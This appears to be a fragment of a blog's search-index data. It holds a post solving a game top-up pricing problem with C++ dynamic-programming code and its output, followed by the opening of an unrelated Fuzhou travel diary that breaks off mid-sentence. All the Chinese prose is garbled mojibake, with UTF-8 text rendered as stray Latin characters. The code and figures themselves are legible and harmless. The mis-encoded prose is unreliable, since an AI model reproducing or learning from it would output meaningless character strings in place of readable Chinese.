å»ä¹°åˆ°å…­åƒå¤šç‚¹åˆ¸ï¼Œä¸ç„¶å°±å¾ˆæµªè´¹ï¼\næ—¢ç„¶è¦ä½¿ç”¨DPï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾—åˆ°çš„çŠ¶æ€è½¬ç§»æ–¹ç¨‹åº”è¯¥æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\nè¿™æ˜¯ä¸ªå¾ˆç®€å•çš„é—®é¢˜ï¼å‡å¦‚æˆ‘ä»¬ä½¿ç”¨çš„è´­ä¹°æ–¹æ¡ˆæ˜¯ m ï¼Œ cost[m] è¡¨ç¤ºä½¿ç”¨ m å·è´­ä¹°æ–¹æ¡ˆ èŠ±è´¹çš„RMB ï¼Œgain[m] è¡¨ç¤ºä½¿ç”¨ m å·è´­ä¹°æ–¹æ¡ˆ è·å¾—çš„ç‚¹åˆ¸ ï¼Œè€Œ dp[i] ä»ç„¶æ˜¯ è´­ä¹° i ç‚¹åˆ¸çš„æœ€å°‘èŠ±é”€ ï¼Œé‚£ä¹ˆï¼š $$ dp[i] = min(dp[i], dp[i - gain[m]] + cost[m]) $$ å…¶å®å°±æ˜¯ï¼šå‡å¦‚æˆ‘ä»¬é€‰æ‹©äº†æ–¹æ¡ˆ m ï¼Œè·å¾—äº†gain[m] çš„ç‚¹åˆ¸ï¼ŒèŠ±æ‰äº† cost[m] çš„é’±ï¼Œè¿˜è¦ç»§ç»­è·å¾— i - gain[m] çš„ç‚¹åˆ¸ï¼Œè¿™ä¸ª i - gain[m] ç‚¹åˆ¸çš„æœ€å°‘èŠ±é”€åº”è¯¥æ˜¯æ­¤å‰å·²ç»è®¡ç®—è¿‡çš„äº†ï¼é‚£ä¹ˆæ€»çš„èŠ±é”€å°±æ˜¯ dp[i - gain[m]] + cost[m] å•¦ï¼\næˆ‘ä»¬è¦è€ƒè™‘çš„æ˜¯æœ€ä¼˜çš„æ–¹æ¡ˆï¼Œåªè¦è¦æŠŠæ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„æ–¹æ¡ˆ m å¾ªç¯ä¸€éå³å¯ã€‚\næ ¹æ®ä»¥ä¸Šçš„åˆ†æï¼Œå¼€å§‹çœŸæ­£çš„DPè¿‡ç¨‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼š\nå¯ä»¥çœ‹åˆ°APP Storeé‡Œé¢æ‰€æœ‰çš„è´­ä¹°æ–¹æ¡ˆä¸­ï¼Œå³ä¾¿è€ƒè™‘äº†èµ é€çš„ç‚¹åˆ¸ï¼Œè·å–åˆ°çš„ç‚¹åˆ¸ä¹Ÿéƒ½æ˜¯ 5 çš„å€æ•°ã€‚ ç›®æ ‡ç‚¹åˆ¸æœ‰å¯èƒ½æ— æ³•æ°å¥½è·å–ï¼Œæ­¤æ—¶å¿…é¡»å®¹è®¸ä¸€å®šç¨‹åº¦çš„ ä¸Šæº¢ ï¼Œä¾‹å¦‚æˆ‘åªå¸Œæœ›è´­ä¹° 888 ç‚¹åˆ¸ï¼Œä½†è¿™ä¸ªæ•°é¢ä¸æ˜¯ 5 çš„å€æ•°ï¼Œå› æ­¤æˆ‘å¯èƒ½éœ€è¦è´­ä¹° 890 çš„ç‚¹åˆ¸ã€‚ void minCostToGetTargetPoints(int targetPoints) { int i; vector\u0026lt;int\u0026gt; dp(targetPoints + 61, DP_MAX); dp[10] = 1; // 10 Points 1 RMB dp[0] = 0; for (i = 10; i \u0026lt;= targetPoints + 60; i += 5) { int m = 0; while (gain[m] \u0026lt;= i) { dp[i] = min(dp[i], dp[i - gain[m]] + cost[m]); m++; } } printResultByTargetPoints(dp, targetPoints); return ; } void printResultByTargetPoints(vector\u0026lt;int\u0026gt;\u0026amp; dp, int targetPoints) { int i = targetPoints; // é¦–å…ˆè¦æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¯ç”¨çš„æ–¹æ¡ˆ while (dp[i] == DP_MAX) i++; // ä¹‹åå¼€å§‹æ‰“å°ä¸Šæº¢ 60 ç‚¹åˆ¸ä¹‹å†…çš„æ–¹æ¡ˆ while (i \u0026lt; dp.size()) { if (dp[i] == DP_MAX) { i += 5; continue; } cout \u0026lt;\u0026lt; \u0026#34;Cost \u0026#34; \u0026lt;\u0026lt; dp[i] \u0026lt;\u0026lt; \u0026#34; yuan to get \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34; points.\\n\u0026#34;; i += 5; } return ; } åœ¨ä¸Šé¢è¿™éƒ¨åˆ†ä»£ç ä¸­ï¼Œæœ‰å‡ ä¸ªç»†èŠ‚ï¼š\nå…è®¸ä¸Šæº¢ 60 ç‚¹åˆ¸ï¼Œå³æˆ‘æœ¬æ¥å¯èƒ½éœ€è¦ä¹° 220 ç‚¹åˆ¸ï¼Œä½†å¯ä»¥è®¡ç®—åˆ°è´­ä¹° 280 ç‚¹åˆ¸çš„æœ€ä¼˜è§£ï¼› å› ä¸ºèƒ½ä¹°åˆ°çš„ç‚¹åˆ¸é¢åº¦ä¸€å®šæ˜¯ 5 çš„å€æ•°ï¼Œå› æ­¤DPæ—¶ç›´æ¥å°† i += 5 ï¼› å¯¹äº æ— è§£ çš„æƒ…å†µï¼Œä¾‹å¦‚è´­ä¹° 13 ä¸ªç‚¹åˆ¸è¿™ç§æƒ…å†µï¼Œ dp[13] ä¸€å®šç­‰äºåŸå§‹çš„ DP_MAX ï¼Œè¿™ç§æƒ…å†µæ­£å¦‚æ­¤å‰æ‰€è¯´ï¼Œè¦å‘ç”Ÿ ä¸Šæº¢ ï¼Œä¹Ÿå°±æ˜¯åœ¨è¾“å‡ºç­”æ¡ˆçš„æ—¶å€™å…ˆæŠŠ i ä¸€ç›´å¾€ä¸Šå¢åŠ ï¼Œç›´åˆ° dp[i] != DP_MAX ä¸ºæ­¢ï¼ ç›´æ¥å°è¯•æ‰§è¡Œä¸€ä¸‹ï¼\n#define DP_MAX 0xffff vector\u0026lt;int\u0026gt; cost = { 1, 6, 45, 68, 118, 198, 348, 648 }; vector\u0026lt;int\u0026gt; gain = { 10, 60, 475, 715, 1240, 2100, 3690, 6868 }; int main() { minCostToGetTargetPoints(2140); } /* æ‰§è¡Œå®Œæˆï¼Œè€—æ—¶ï¼š0 ms Cost 202 yuan to get 2140 points. Cost 204 yuan to get 2145 points. Cost 203 yuan to get 2150 points. Cost 205 yuan to get 2155 points. Cost 204 yuan to get 2160 points. Cost 206 yuan to get 2165 points. Cost 205 yuan to get 2170 points. Cost 207 yuan to get 2175 points. Cost 206 yuan to get 2180 points. Cost 208 yuan to get 2185 points. Cost 207 yuan to get 2190 points. Cost 209 yuan to get 2195 points. Cost 208 yuan to get 2200 points. */ éš¾å—äº†ï¼è¿™æ˜¯ä»€ä¹ˆè¾“å‡ºå•Šï¼Ÿï¼Ÿæˆ‘åªçŸ¥é“è¦è·å¾—ç›®æ ‡ç‚¹åˆ¸æœ€å°‘éœ€è¦å¤šå°‘å…ƒï¼Œä½†æ˜¯ç¨‹åºæ²¡å‘Šè¯‰æˆ‘å…·ä½“çš„å……å€¼æ–¹æ¡ˆï¼\nçœ‹æ¥éœ€è¦ä¸€ä¸ªé¢å¤–çš„å˜é‡æ¥å‘Šè¯‰æˆ‘æœ€è¿‘çš„ä¸€æ¬¡å……å€¼æ˜¯å¤šå°‘æ•°é¢ï¼Œç„¶åæˆ‘é€æ¸å¾€å›é€’æ¨ï¼Œè·å¾—æ€»çš„å……å€¼æ–¹æ¡ˆã€‚\næ–°å¢ä¸€ä¸ªå°åŠŸèƒ½ï¼Œè¦é¢å¤–èŠ±è´¹ä¸å°‘ä»£ç è¡Œï¼š\nvoid minCostToGetTargetPoints(int targetPoints) { int i; vector\u0026lt;int\u0026gt; dp(targetPoints + 61, DP_MAX); vector\u0026lt;int\u0026gt; lastTopup(targetPoints + 61, DP_MAX); dp[10] = 1; // 10 Points 1 RMB dp[0] = 0; for (i = 10; i \u0026lt;= targetPoints + 60; i += 5) { int m = 0; while (gain[m] \u0026lt;= i) { if (dp[i] \u0026gt;= dp[i - gain[m]] + cost[m]) { dp[i] = dp[i - gain[m]] + cost[m]; // æ–°å¢ï¼šä¿å­˜ä¸€ä¸‹æœ€åä¸€æ¬¡å……å€¼è´­ä¹°çš„æ–¹æ¡ˆ lastTopup[i] = m; } m++; } } printResultByTargetPoints(dp, lastTopup, targetPoints); return ; } void printResultByTargetPoints(vector\u0026lt;int\u0026gt;\u0026amp; dp, vector\u0026lt;int\u0026gt;\u0026amp; lastTopup, int targetPoints) { int i = targetPoints; // é¦–å…ˆè¦æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¯ç”¨çš„æ–¹æ¡ˆ while (dp[i] == DP_MAX) i++; // ä¹‹åå¼€å§‹æ‰“å°ä¸Šæº¢ 60 ç‚¹åˆ¸ä¹‹å†…çš„æ–¹æ¡ˆ while (i \u0026lt; dp.size()) { if (dp[i] == DP_MAX) { i += 5; continue; } cout \u0026lt;\u0026lt; \u0026#34;Cost \u0026#34; \u0026lt;\u0026lt; dp[i] \u0026lt;\u0026lt; \u0026#34; yuan to get \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34; points.\\n\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;The method is : \\n\\tcost(ï¿¥)\\tpoints\\n\u0026#34;; for (int tmp = i; tmp \u0026gt; 0; ) { int m = lastTopup[tmp]; cout \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; cost[m] \u0026lt;\u0026lt; \u0026#34;\\t\\t\u0026#34; \u0026lt;\u0026lt; gain[m] \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; tmp -= gain[m]; } i += 5; } } æ‰§è¡Œä¸€ä¸‹ï¼\n#define DP_MAX 0xffff vector\u0026lt;int\u0026gt; cost = { 1, 6, 45, 68, 118, 198, 348, 648 }; vector\u0026lt;int\u0026gt; gain = { 10, 60, 475, 715, 1240, 2100, 3690, 6868 }; int main() { minCostToGetTargetPoints(2140); } /* æ‰§è¡Œå®Œæˆï¼Œè€—æ—¶ï¼š0 ms Cost 202 yuan to get 2140 points. The method is : cost(ï¿¥) points 198 2100 1 10 1 10 1 10 1 10 Cost 204 yuan to get 2145 points. The method is : cost(ï¿¥) points 68 715 68 715 68 715 Cost 203 yuan to get 2150 points. The method is : cost(ï¿¥) points 198 2100 1 10 1 10 1 10 1 10 1 10 Cost 205 yuan to get 2155 points. The method is : cost(ï¿¥) points 68 715 68 715 68 715 1 10 Cost 204 yuan to get 2160 points. The method is : cost(ï¿¥) points 198 2100 6 60 ======= æ­¤å¤„çœç•¥è‹¥å¹²è¡Œ ======= */ ä»ä¸Šé¢è¿™ä¸ªä¾‹å­çš„è¾“å‡ºå¯ä»¥çœ‹åˆ°ï¼šåŒæ ·çš„ 204ï¿¥ ï¼Œæœ‰çš„æ–¹æ¡ˆå¯ä»¥ä¹°åˆ° 2145 ç‚¹åˆ¸ï¼Œè€Œæœ‰çš„èƒ½ä¹°åˆ° 2160 ç‚¹åˆ¸ï¼å·®äº†ä¸€å—å¤šï¼å› æ­¤æˆ‘ä»¬ä¸èƒ½åªæ‰“å°ç›®æ ‡ç‚¹åˆ¸çš„æœ€ä¼˜è§£ï¼Œå¾€ä¸Šå¤šæ‰“å°å‡ ä¸ªï¼Œå¯èƒ½å‘ç°ç”¨ç›¸åŒçš„é’±å¯ä»¥ä¹°åˆ°æ›´å¤šç‚¹åˆ¸ï¼Œä½•ä¹ä¸ä¸ºå‘¢ ğŸ˜¹\nåœºæ™¯äºŒã€å›ºå®šä¸€å®šèŠ±é”€ï¼Œè´­ä¹°æœ€å¤šç‚¹åˆ¸ åœºæ™¯ä¸€æ˜¯æ¯”è¾ƒå¸¸è§çš„ï¼Œè‡³äºåœºæ™¯äºŒï¼Œæ‰‹å¤´æ¯”è¾ƒæ‹®æ®çš„æ—¶å€™ç”¨å§ï¼\nè¿™ä¸ªåœºæ™¯å°±æ˜¯ä¸ªå…¸å‹çš„ å®Œå…¨èƒŒåŒ…é—®é¢˜ è€Œå·²ï¼šä»¤ dp[j] è¡¨ç¤ºèŠ±è´¹ j å…ƒé’±èƒ½ä¹°åˆ°çš„æœ€å¤šç‚¹åˆ¸ï¼Œé‚£ä¹ˆå¯¹äºæ‰€æœ‰å¯è¡Œçš„æ–¹æ¡ˆ m ï¼Œè½¬ç§»æ–¹ç¨‹å°±æ˜¯ï¼š $$ dp[i] = max(dp[i], dp[i - cost[m]] + gain[m]) $$ å…¶å®ä¸¤ä¸ªåœºæ™¯æ€è·¯å·®ä¸å¤šï¼Œç›´æ¥ä¸Šä»£ç ï¼\nvoid maxPointsByMaxCost(int maxCost) { int j = 0; vector\u0026lt;int\u0026gt; dp(maxCost + 1, 0); vector\u0026lt;int\u0026gt; lastPurchase(maxCost + 1, 0); for (j = 0; j \u0026lt;= maxCost; j++) { int m = 0; while (cost[m] \u0026lt;= j) { if (dp[j] \u0026lt;= dp[j - cost[m]] + gain[m]) { dp[j] = dp[j - cost[m]] + gain[m]; lastPurchase[j] = m; } m++; } } printResultByMaxCost(dp, lastPurchase, maxCost); return ; } void printResultByMaxCost(vector\u0026lt;int\u0026gt;\u0026amp; dp, vector\u0026lt;int\u0026gt;\u0026amp; lastPurchase, int\u0026amp; maxCost) { cout \u0026lt;\u0026lt; \u0026#34;You can get \u0026#34; \u0026lt;\u0026lt; dp[maxCost] \u0026lt;\u0026lt; \u0026#34; points using \u0026#34; \u0026lt;\u0026lt; maxCost \u0026lt;\u0026lt; \u0026#34; yuan.\\n\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;The method is: \\n\\tCost(ï¿¥)\\tPoints\\n\u0026#34;; for (int tmp = maxCost; tmp \u0026gt; 0; ) { int m = lastPurchase[tmp]; cout \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; cost[m] \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; gain[m] \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; tmp -= cost[m]; } return ; } æ‰§è¡Œä¸€ä¸‹ï¼š\n#define DP_MAX 0xffff vector\u0026lt;int\u0026gt; cost = { 1, 6, 45, 68, 118, 198, 348, 648 }; vector\u0026lt;int\u0026gt; gain = { 10, 60, 475, 715, 1240, 2100, 3690, 6868 }; int main() { // minCostToGetTargetPoints(2135); maxPointsByMaxCost(499); maxPointsByMaxCost(200); maxPointsByMaxCost(20); } /* æ‰§è¡Œå®Œæˆï¼Œè€—æ—¶ï¼š0 ms You can get 5280 points using 499 yuan. The method is: Cost(ï¿¥) Points 198 2100 198 2100 45 475 45 475 6 60 6 60 1 10 You can get 2120 points using 200 yuan. The method is: Cost(ï¿¥) Points 198 2100 1 10 1 10 You can get 200 points using 20 yuan. The method is: Cost(ï¿¥) Points 6 60 6 60 6 60 1 10 1 10 */ æ€»çš„ä»£ç  #define DP_MAX 0xffff vector\u0026lt;int\u0026gt; cost = { 1, 6, 45, 68, 118, 198, 348, 648 }; vector\u0026lt;int\u0026gt; gain = { 10, 60, 475, 715, 1240, 2100, 3690, 6868 }; void printResultByTargetPoints(vector\u0026lt;int\u0026gt;\u0026amp; dp, vector\u0026lt;int\u0026gt;\u0026amp; lastTopup, int targetPoints); void minCostToGetTargetPoints(int targetPoints) { int i; vector\u0026lt;int\u0026gt; dp(targetPoints + 61, DP_MAX); vector\u0026lt;int\u0026gt; lastTopup(targetPoints + 61, DP_MAX); dp[10] = 1; // 10 Points 1 RMB dp[0] = 0; for (i = 10; i \u0026lt;= targetPoints + 60; i += 5) { int m = 0; while (gain[m] \u0026lt;= i) { if (dp[i] \u0026gt;= dp[i - gain[m]] + cost[m]) { dp[i] = dp[i - gain[m]] + cost[m]; // æ–°å¢ï¼šä¿å­˜ä¸€ä¸‹æœ€åä¸€æ¬¡å……å€¼è´­ä¹°çš„æ–¹æ¡ˆ lastTopup[i] = m; } m++; } } printResultByTargetPoints(dp, lastTopup, targetPoints); return ; } void printResultByTargetPoints(vector\u0026lt;int\u0026gt;\u0026amp; dp, vector\u0026lt;int\u0026gt;\u0026amp; lastTopup, int targetPoints) { int i = targetPoints; // é¦–å…ˆè¦æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¯ç”¨çš„æ–¹æ¡ˆ while (dp[i] == DP_MAX) i++; // ä¹‹åå¼€å§‹æ‰“å°ä¸Šæº¢ 60 ç‚¹åˆ¸ä¹‹å†…çš„æ–¹æ¡ˆ while (i \u0026lt; dp.size()) { if (dp[i] == DP_MAX) { i += 5; continue; } cout \u0026lt;\u0026lt; \u0026#34;Cost \u0026#34; \u0026lt;\u0026lt; dp[i] \u0026lt;\u0026lt; \u0026#34; yuan to get \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34; points.\\n\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;The method is : \\n\\tcost(ï¿¥)\\tpoints\\n\u0026#34;; for (int tmp = i; tmp \u0026gt; 0; ) { int m = lastTopup[tmp]; cout \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; cost[m] \u0026lt;\u0026lt; \u0026#34;\\t\\t\u0026#34; \u0026lt;\u0026lt; gain[m] \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; tmp -= gain[m]; } i += 5; } } void printResultByMaxCost(vector\u0026lt;int\u0026gt;\u0026amp; dp, vector\u0026lt;int\u0026gt;\u0026amp; lastPurchase, int\u0026amp; maxCost); void maxPointsByMaxCost(int maxCost) { int j = 0; vector\u0026lt;int\u0026gt; dp(maxCost + 1, 0); vector\u0026lt;int\u0026gt; lastPurchase(maxCost + 1, 0); for (j = 0; j \u0026lt;= maxCost; j++) { int m = 0; while (cost[m] \u0026lt;= j) { if (dp[j] \u0026lt;= dp[j - cost[m]] + gain[m]) { dp[j] = dp[j - cost[m]] + gain[m]; lastPurchase[j] = m; } m++; } } printResultByMaxCost(dp, lastPurchase, maxCost); return ; } void printResultByMaxCost(vector\u0026lt;int\u0026gt;\u0026amp; dp, vector\u0026lt;int\u0026gt;\u0026amp; lastPurchase, int\u0026amp; maxCost) { cout \u0026lt;\u0026lt; \u0026#34;You can get \u0026#34; \u0026lt;\u0026lt; dp[maxCost] \u0026lt;\u0026lt; \u0026#34; points using \u0026#34; \u0026lt;\u0026lt; maxCost \u0026lt;\u0026lt; \u0026#34; yuan.\\n\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;The method is: \\n\\tCost(ï¿¥)\\tPoints\\n\u0026#34;; for (int tmp = maxCost; tmp \u0026gt; 0; ) { int m = lastPurchase[tmp]; cout \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; cost[m] \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; gain[m] \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; tmp -= cost[m]; } return ; } int main() { minCostToGetTargetPoints(2135); maxPointsByMaxCost(499); maxPointsByMaxCost(200); maxPointsByMaxCost(20); } æˆ‘ç”¨äº†LeetCodeçš„ playground åŠŸèƒ½ï¼Œå› æ­¤è¿™ä¸ªä»£ç å°±æ²¡æœ‰å¤´å‡½æ•°ä¹‹ç±»äº†~\nåœ¨æœ€åï¼Œä»Šå¹´æˆ‘å¸Œæœ›è´­ä¹°é²ç­å’Œå­™è†‘çš„çš®è‚¤ï¼Œå¯èƒ½è¿˜éœ€è¦è¿›é˜¶ä¸€ä¸‹æˆ˜ä»¤ï¼æ€»å…±éœ€è¦ 1430+710+388 = 2528 ç‚¹åˆ¸ã€‚æˆ‘çš„ç¨‹åºå‘Šè¯‰æˆ‘ï¼š\n/* æ‰§è¡Œå®Œæˆï¼Œè€—æ—¶ï¼š0 ms Cost 241 yuan to get 2530 points. The method is : cost(ï¿¥) points 198 2100 6 60 6 60 6 60 6 60 6 60 6 60 6 60 1 10 Cost 241 yuan to get 2535 points. The method is : cost(ï¿¥) points 45 475 45 475 45 475 45 475 45 475 6 60 6 60 1 10 1 10 1 10 1 10 Cost 242 yuan to get 2540 points. The method is : cost(ï¿¥) points 198 2100 6 60 6 60 6 60 6 60 6 60 6 60 6 60 1 10 1 10 Cost 242 yuan to get 2545 points. The method is : cost(ï¿¥) points 45 475 45 475 45 475 45 475 45 475 6 60 6 60 1 10 1 10 1 10 1 10 1 10 ===== çœç•¥è‹¥å¹²è¡Œ ===== */ çœ‹æ¥æˆ‘å¾—èŠ±æ‰ 241ï¿¥ ï¼ŒçœŸæ˜¯ä¸€ç¬”å¤§æ•°ç›® ğŸ˜¿\nåŒæ—¶ï¼Œæˆ‘çš„ç¨‹åºè¿˜å‘Šè¯‰æˆ‘ï¼Œ241å…ƒæœ€å¤šå¯ä»¥è·å–åˆ°ï¼š\n/* æ‰§è¡Œå®Œæˆï¼Œè€—æ—¶ï¼š0 ms You can get 2535 points using 241 yuan. The method is: Cost(ï¿¥) Points 45 475 45 475 45 475 45 475 45 475 6 60 6 60 1 10 1 10 1 10 1 10 You can get 2575 points using 243 yuan. The method is: Cost(ï¿¥) Points 198 2100 45 475 */ è¯¶ï¼Ÿå¤šèŠ±2å—é’±ï¼Œå³243å…ƒï¼Œèƒ½å¤Ÿå¤šè·å– 40 ç‚¹åˆ¸ï¼Ÿ\næˆ‘å…ˆå»å……é’±äº†æœ‹å‹ä»¬~\n","date":"2022-01-31T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E7%8E%8B%E8%80%85%E8%8D%A3%E8%80%80%E8%99%8E%E5%B9%B4%E5%85%85%E5%80%BC%E7%AE%80%E5%8D%95dp%E9%97%AE%E9%A2%98/","title":"ç‹è€…è£è€€è™å¹´å……å€¼â€”â€”ç®€å•DPé—®é¢˜"},{"content":"æ¸¸ç¦å·ä¸¤å¤©è€Œå›ï¼Œæ„Ÿæƒ³ä¸å¤šï¼Œç„¶è€Œä¸å¯ä¸å†™ã€‚æˆ‘ä¸€å‘è§‰å¾—ï¼Œæ¸¸è€Œä¸è®°ï¼Œåˆ™ä¸€è·¯æ‰€å¾—çš„ç‹¬ç‰¹è€Œç¾å¦™çš„ä½“éªŒæ€»æ˜¯è¦éšç€æ—¶é—´æµé€è€Œæ·¡å»ï¼Œæœªå…å¯æƒœã€‚\né¦–æ—¥ 1æœˆ17æ—¥ï¼ŒåŒææ³“è¸ä¸Šå‰å¾€ç¦å·çš„åŠ¨è½¦ã€‚\nè¿™ä¼¼ä¹æ˜¯æˆ‘é¦–æ¬¡ä¹˜ååŠ¨è½¦å‡ºé—¨æ—…è¡Œï¼ˆæ¼³å·åˆ°å¦é—¨çš„åå‡ åˆ†é’Ÿè‡ªç„¶æ˜¯ä¸è®¡åœ¨å†…çš„ï¼‰ã€‚åœ¨ç¦å»ºçœå†…ï¼Œçª—å¤–æœ€å¤šçš„åº”è¯¥æ˜¯ä¸˜é™µå’Œæ‘åº„ï¼Œé—´ä»¥åŸå¸‚å’Œå·¥å‚ï¼Œæ™¯è‡´å¹¶ä¸è¶³ä»¥ä»¤äººæ²‰é†‰å…¶ä¸­ã€‚æˆ‘åœ¨è½¦ä¸Šçœ‹èµ·äº†æ¯›é€‰ï¼Œå§‹è§‰å¾—æˆ‘çš„ä¹˜è½¦ä¿®ä¸ºå·²ç»ä¸å¾€æ—¥æœ‰å¤©å£¤ä¹‹åˆ«ã€‚æˆ‘è¿˜æ˜¯åº”è¯¥å°†è¿™ä¸€å˜åŒ–å½’åŠŸç»™æš‘å‡æœŸé—´æ¯æ—¥ä¸¤å°æ—¶çš„ç­è½¦ï¼Œå…¶æ—¶æ‰€å—çš„åŠ³ç´¯ä¸é¢ ç°¸ä¸æ„¿å›æƒ³ï¼Œæœ‰æ„Ÿä¸€åˆ‡ä»è„†å¼±åˆ°åšå¼ºéƒ½æ˜¯ç»è¿‡äº†ä¸çŸ¥å¤šå°‘ç—›è‹¦è€Œæ— å¥ˆçš„ä¿®ç‚¼å•Šã€‚\nåˆ°è¾¾ç¦å·ç«™è¿˜ä¸åˆ°ä¸¤ç‚¹ï¼Œæˆ‘ä»¬ç›´æ¥è¿›å…¥åœ°é“ï¼Œå‰å¾€æ–°åç¤¾ç¦å»ºåˆ†ç¤¾ã€‚ä»åœ°é“å‡ºæ¥çš„æ—¶å€™ï¼Œæˆ‘å¼€å§‹å¤´ä¸€æ¬¡è§‚å¯Ÿè¿™ä¸ªåŸå¸‚äº†ã€‚ç¦å·çš„è¡—é“æ˜¯æ•´æ´çš„ï¼Œè¡—è¾¹çš„ä¸€é•¿æ’å•†é“ºæç„¶æ˜¯çŸ³ç çš„å¢å¼ºç‰ˆæœ¬ï¼›è¡—é“ä¸¤è¾¹çš„æ¥¼æˆ¿å¹¶ä¸é«˜å¤§ï¼Œå› æ­¤å¹¶ä¸ç»™äººä»¥å¨å‹ï¼›æ­¤å¤„æ¥¼æˆ¿ä¹‹é«˜åº¦é€‚ä¸­ã€è¡—é“ä¹‹ç¹åæœ‰åº¦ã€å•†é“ºä¹‹å¿™ç¢Œæ¸©é¦¨ï¼Œå¾ˆéš¾ä»¤äººäº§ç”Ÿç–ç¦»ä¹‹æ„Ÿï¼Œåªè§‰å¾—è‡ªå·±çš„å®¶ä¹¡ä¸æ­¤å¹¶æ— ä¸åŒï¼Œæˆ–è€…è‡ªå·±çš„å®¶ä¹¡æœªæ¥æ­£è¯¥å¦‚æ­¤ã€‚\nçœŸæ­£çš„å·¨åŸï¼Œå¦‚åŒ—äº¬ï¼Œå®ƒçš„æŸäº›åœ°æ–¹ä¼šä½¿äººæ„Ÿåˆ°éå¸¸é™Œç”Ÿï¼Œé‚£äº›åœ°æ–¹æœ‰æå¤§çš„äººæµï¼Œæœ‰ä¸‡èˆ¬çš„å…‰å½±ï¼Œæœ‰é“ºé¢è€Œæ¥çš„å®å¤§å»ºç­‘ï¼Œç»¼åˆæ¥è¯´ï¼Œå°±æ˜¯æœ‰ä¸€ç§ä»¤äººæ—¶åˆ»ä¸èƒ½åœæ­‡çš„ç©ºæ°”ï¼Œåˆ†æ˜åœ¨å‘Šè¯‰å¤–åœ°æ¥çš„äººï¼šæ­¤å¤„æ— ç«‹è¶³ä¹‹åœ°ã€‚è€Œè¿™æ ·çš„åœ°æ–¹ï¼Œæ€»æ˜¯åœ¨å·¨åŸç»™äººå¸¦æ¥çš„æ–‡åŒ–çš„ã€èµ„æºçš„å¸å¼•ä¸Šï¼Œé‡æ–°å¼•å…¥ä¸€ç•ªç†æ™ºï¼Œä¹Ÿé‡æ–°å¸¦ç»™ç”Ÿæ´»äºå·¨åŸä¸­çš„å¤–åœ°æ¥è€…ä¸€ç§æ¼‚æ³Šæ— ä¾çš„å‡„è‹¦æ„Ÿå—ã€‚\nä¸Šæ¬¡åœ¨å¤–åœ°è§åˆ°è¿™æ ·çš„æ¸©é¦¨çš„ã€å¦‚åŒå®¶ä¹¡ä¸€èˆ¬çš„åœºé¢ï¼Œå·²ä¸çŸ¥æ˜¯ä»€ä¹ˆæ—¶å€™ã€‚æ­¤å‰åœ¨æ­å·æ˜¯äº§ç”Ÿè¿‡ç±»ä¼¼çš„ç†Ÿæ‚‰æ„Ÿçš„ï¼Œä½†é‚£æ˜¯å¯¹äºè¾ƒæ—§çš„ã€è€è¡—é“çš„ç†Ÿæ‚‰æ„Ÿï¼Œè€Œç¦å·æ–°åç¤¾é™„è¿‘ï¼Œé‚£æ˜¯è¾ƒæ–°çš„ã€æ­£åœ¨å‘å±•ä¸­çš„ç†Ÿæ‚‰æ„Ÿã€‚\nææ³“åœ¨æ–°åç¤¾åŠå®Œäº†äº‹æƒ…ä¹‹åï¼Œæˆ‘ä»¬ä¹˜ååœ°é“åˆ°è¾¾ä¸¤å¤©çš„è½è„šä¹‹åœ°â€”â€”å¦‚å®¶é…’åº—ï¼ˆè¾¾æ˜ç¾é£Ÿè¡—åº—ï¼‰ã€‚\nä¸ç®¡åœ¨ä»€ä¹ˆæ—¶å€™ï¼Œåˆæ¬¡è¿›å…¥åˆ°é…’åº—æˆ¿é—´çš„é‚£ç§å¿«ä¹æ€»æ˜¯å­˜åœ¨çš„ã€‚è¿™æ˜¯ä¸€ç§æ¥åˆ°äº†ä»–ä¹¡ä¹‹åã€æ‰¾åˆ°ä¸€å—è½è„šç‚¹çš„å–œæ‚¦ï¼Œä¹Ÿæ˜¯ä¸€ç§æ—…é€”åŠ³ç´¯ä¹‹åã€ç»ˆäºå¯ä»¥æ´—å»é£å°˜çš„å–œæ‚¦ï¼›åŠ ä¹‹æˆ‘ä»¬ä¸¤äººéƒ½èƒŒç€æ²‰é‡çš„èƒŒåŒ…ï¼Œè¿›å…¥æˆ¿é—´ä¹‹åå¾—ä»¥å½»åº•è§£è„±ï¼Œä½•å…¶æ¬¢å¿«ä¹Ÿï¼\nåœ¨é…’åº—å†…æ­‡æ¯æ—¶ï¼Œé åœ¨åºŠä¸Šçœ‹æ–°é—»æ˜¯æˆ‘æœ€å¤§çš„çˆ±å¥½ã€‚æˆ‘å–œæ¬¢ç”µè§†ä¸Šä¼ æ¥ä¸€æœ¬æ­£ç»çš„æ’­éŸ³è…”ï¼Œä¸ç®¡å…¶å†…å®¹å¦‚ä½•ï¼ˆå¤šæ•°æƒ…å†µä¸‹æ˜¯å¾ˆç§¯æçš„ï¼‰ï¼Œè€Œæˆ‘å°†æˆ‘çš„ä¸€åˆ‡è´Ÿæ‹…éƒ½å¸åˆ°åºŠä¸Šï¼Œè¿™æ ·çš„ç¯å¢ƒä»¤æˆ‘æ„Ÿåˆ°æœ€å¤§åœ°æ”¾æ¾ã€‚\nå‚æ™šï¼Œæˆ‘ä»¬å·²ç»æ— 